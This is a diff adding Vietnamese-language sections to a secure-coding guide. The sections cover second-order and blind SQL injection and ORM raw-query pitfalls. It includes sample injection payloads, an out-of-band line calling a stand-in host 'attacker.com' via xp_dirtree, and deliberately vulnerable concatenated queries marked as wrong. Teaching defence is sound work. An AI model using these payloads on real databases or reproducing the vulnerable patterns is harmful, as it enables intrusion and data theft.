@@ -60,6 +60,54 @@ function safe(): { sql: string; params: unknown[] } {
 
 ---
 
+## 🕵️ 2nd-Order SQL Injection
+
+Input độc **không tấn công lúc nhập — được lưu an toàn — rồi tấn công ở query khác** khi được đọc ra và nối chuỗi:
+
+```
+1. Signup: username = admin'--            → parameterized, lưu an toàn vào DB ✅
+2. Login:  SELECT ... WHERE user = 'admin'--' AND pw = '...'
+           (username đọc từ DB, nối thẳng vào SQL lần 2) 💥
+```
+
+- Đây là lý do "đã parameterize khi INSERT" là **chưa đủ** — mọi data đọc từ DB cũng phải được coi là untrusted khi dùng lại.
+- ORM raw query + string concat với data từ DB là lỗi 2nd-order kinh điển.
+- Phòng chống: parameterized **ở mọi query**, kể cả query dùng data từ DB — không có ngoại lệ "data nội bộ".
+
+## 🙈 Blind SQL Injection
+
+Trang không hiện error hay data trả về — attacker vẫn khai thác qua **tín hiệu phụ**:
+
+| Loại | Tín hiệu | Payload ví dụ |
+|---|---|---|
+| **Boolean-based** | Nội dung trang khác nhau theo điều kiện đúng/sai | `' AND (SELECT COUNT(*) FROM users)>0--` |
+| **Time-based** | Response chậm khi điều kiện đúng | `'; IF(1=1) WAITFOR DELAY '0:0:5'--` / `SLEEP(5)` |
+| **Out-of-band (OAST)** | Server chủ động kết nối ra DNS/HTTP của attacker | `; EXEC master..xp_dirtree '//attacker.com'` |
+
+- Attacker đoán từng ký tự dữ liệu qua hàng nghìn request — chậm nhưng **bypass được mọi trang lỗi được ẩn**.
+- `SLEEP(5)` trong ⚠️ Lưu Ý ở trên chính là dấu hiệu time-based blind — thấy query chậm bất thường + input user trong SQL = nghiêm trọng.
+- Phòng chống giống SQLi thường (parameterized) — vì nó cùng gốc: nối chuỗi.
+
+## 🧨 ORM vẫn dính SQLi: raw query + string concat
+
+ORM parameterize mặc định, nhưng **mọi escape hatch đều mở cửa SQLi trở lại**:
+
+```typescript
+// Prisma
+prisma.$queryRaw(`SELECT * FROM users WHERE name = '${name}'`);        // ❌ concat
+prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`;            // ✅ tagged template tự parameterize
+prisma.$queryRawUnsafe(userControlledSql);                              // ❌ nguy hiểm nhất
+
+// TypeORM / Sequelize tương tự
+repo.query(`... WHERE name = '${name}'`);        // ❌
+repo.query("... WHERE name = $1", [name]);       // ✅
+```
+
+- **Audit checklist**: grep mọi `raw`/`query`/`queryRawUnsafe`/template literal chứa `${}` — đây là các điểm dính SQLi trong codebase "đã dùng ORM".
+- Đừng bao giờ xây chuỗi SQL từ user input, kể cả sau khi "escape" bằng tay — escape bằng tay sai ở charset/encoding.
+
+---
+
 ## 🎯 Khi nào dùng
 
 - Mọi query có input từ user: login, search, filter, sort, pagination — không ngoại lệ.
